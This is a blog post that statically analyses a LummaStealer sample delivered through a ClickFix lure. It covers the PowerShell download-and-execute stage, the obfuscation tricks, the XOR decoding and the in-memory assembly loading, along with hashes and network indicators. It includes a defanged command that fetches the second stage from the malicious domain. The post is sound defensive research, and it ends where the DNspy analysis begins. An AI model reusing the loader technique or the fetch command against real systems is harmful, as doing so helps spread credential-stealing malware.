---
layout: post
title:  "LummaStealer - Static Malware Analysis"
date:   2025-06-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Static LummaStealer Malware Analysis

Lumma is here too stay. This payload was from a clickfix prompt. Except rather than the standard 'paste this in windows run' it gets you to download a file and run it. Way less believable. But still hopefully some good darn malware. I'm going to dig in deep to this one and try to pull as much as I can. From the server its downloaded from to the last outbound call.

### Downloading first payload

Payload is a .cmd file that users are prompted to run to verify there identity.

MD5 Hash is : ``33a21b320c9d33e77f947862aee7cfcf825f685631f259c82cf7ae6d8db67a81``

![Stage 1](/images/cmd_vt_reputation.PNG)

Interesting. Looks like known malware. Trusty Windows Defender failed to block this, not that I expected it too.

![Stage 2](/images/cf_device.PNG)

Well, pretty straight forward. Calls powershell to reach out to a domain and run the response as code.

Lets probe this domain in a fresh sandbox and see what we can pull. We don't want to run the code. But it'd be nice to see what powershell script it returns.

So if we remove the ``| iex`` the ps1 script ret.urned won't be ran. So lets create our own .cmd file use Notepad++ with this in it ``powershell -w h -c iwr 'hXXps://evan-hartwell[.]space' -OutFile fat_old_payload.ps1``

![Stage 3](/images/second_payload_command_and_cap.PNG)

Alright, so when running the command to grab the payload I ran a pcap. As a result we know:
- IP of 'evan-hartwell[.]space > 194.15.216.208
- Lots and lots of bytes we're sent
- Connection was closed with TCP RST and ACK flags

![Stage 4](/images/ip_rep_second_payload.PNG)

We've got a pretty good network IOC here that isn't sitting behind Cloudflare. I'll come back this later and see what else we can find with it.

![Stage 6](/images/file.PNG)

So, this is our file. A healthy 4.5mbs of bits and bytes. 

Here is the MD1 hash ``3707fb795cd31deea7c4518a420a1a29`` from HashCalc. 

![Stage 6](/images/VT_ps_payload.PNG)

Red flags everywhere here with this VT report. Pretty early days which is cool. Reports are from less than 24 hours ago.

![Stage 6](/images/second_payload_code.PNG)

Alright the above is a preview of what we are dealing with. Lots and lots of crap. 219 lines of code to top it off.

Looks to be heavily obfuscated. Let's work our way through from start to finish.

First off I'm going to remove all the comments. Because they look to be nothing but a distraction? Might be wrong here but I'm going gonna do it.

### Obfuscation techniques

Multiple functions use this method, assigns a value to func. 

![Stage 7](/images/VoJH_function.PNG)

- Sets the value of VoJH to "CUAvY"
- Therefore, everytime this function is called it returns "CUAvY"

Creation of a true true statement to set a variable value

![Stage 8](/images/1st_nested_mega_func.PNG)

- Creates a true statement, to confuse. Always correct (381 = 381)
- $ofCFAQtwmREBAbV = pRgJCFouA
- $ziVemRYxAvHXzqM = kaHyyOiMg

Creation of value to null.
1. UTF-8 encoding to null
2. Creates array, iterates through it, squares each value, sets to null
3. Creates array, iterates through it, sets all values to lowercase, sets to null

![Stage 9](/images/UTF-8_encoding.PNG)
![Stage 10](/images/create_array_null.PNG)
![Stage 13](/images/to_lower.PNG)

Pointless creation and modification of arrays

1. Creates array, iterates through it, times each value by 2, sets new values to the array 'result', which is never used.
2. Creates array, iterates through it, ensures value is not greater than 255 (0xFF hex value), throws out data/result.

![Stage 11](/images/result_array.PNG)
![Stage 12](/images/band_obfuscation.PNG)

These obfuscation techniques are scattered across the .ps1 script multiple times. 

### Here is the good stuff

![Stage 13](/images/base64_strings.PNG)

Alright now we've been through all the crap. Let's have a look into these strings.

![Stage 14](/images/length_of_strings.PNG)

From the screenshot we can see that these two strings are 4.602mbs of data. That's a lot of B64. 

So we have two variables of interest ``$sOsFAVXtPZoUYex`` and ``$PWzZPneyOTwFxRA``

Let's try and decode these from B64 and see if we get any file headers/commands.

![Stage 15](/images/chef_B64.PNG)

Alright so above I've baked down some B64 with no luck on the first variable and the second. 

So I'm confident that's our payload. Because if it's not there's very little bits and bytes left to put a payload in.

Let's ctrl+f and see where else these magic variables pop up.

### And some more good stuff

Alright bingo. Looks like we have an XOR function that uses ``$sOsFAVXtPZoUYex`` and ``$PWzZPneyOTwFxRA``

![Stage 16](/images/xor_function.PNG)

Ok bit to unpack here. So I'll explain what everything we are seeing is individually
- ``$PWzZPneyOTwFxRA`` --> Our payload (variable)
- ``$sOsFAVXtPZoUYex`` --> Key used for XOR (variable)
- ``bxor`` --> bitwise XOR in PS

So we have a for loop sifting through each byte in our payload ``$PWzZPneyOTwFxRA``
- For each byte in the payload string we are applying the corresponding XOR key from the variable ``$sOsFAVXtPZoUYex``
- The result is then stored back into the payload variable ``$PWzZPneyOTwFxRA``

Hypothetically, if no other funny business is going on further down the code we should have our payload! Decoded and ready to inspect.

### Run this in memory?

Well this is interesting.

![Stage 17](/images/loads_in_memory.PNG)

Let's break down what this does. We can see our magic payload variable as well.
- Sets the value of ``$djiOPViLVyuSVPv`` to our magic payload 
- Creates the variable that uses System.Reflection.Assembly.Load() to load each byte of ``$djiOPViLVyuSVPv`` to memory. 
- Sets the value of ``$qzBoWfMkoCHlDBv`` as the entry point method for Main ``$qzBoWfMkoCHlDBv = $cOABfBZeRSopDLe.EntryPoint``
- Loads it in memory!

### Lets print this payload

Alright we know the variable ``$PWzZPneyOTwFxRA`` stores the unencoded payload. So lets do up a powershell script that prints this value after decoded using the process above to a .txt file. 

This is a safe way of pulling the payload, without actually executing it.

Here's the script I've spun up to do this.

![Stage 18](/images/writing_payload_to_bin.PNG)

Let's run it. Alright we've created a file, 1.6mbs. Let's save it as a .exe and whack it into PE Studio for a first glance look.

### The juice has been found

Alright, this is odd. Hash doesn't have a rep. Perhaps the key is unique for each payload? I'm not too sure. Anyway I might revisit this. Because I may have compiled it incorrectly. Or I could be stepping on a Russian's toes right now. 

![Stage 19](/images/PE_studio_details.PNG)

Some cool notes from PE Studio
- Unrecognisable hash
- WeavePron (Lumma IOC)
- MZ header (.exe/dll)
- Compiled in the future (Aug 10th | 2040) (Russian time machine)
- .NET modules

### DNspy analysis

We know it uses .NET from the in-memory file loading techniques we've seen and the PE studio overview. Lets boot it up and see what we can see.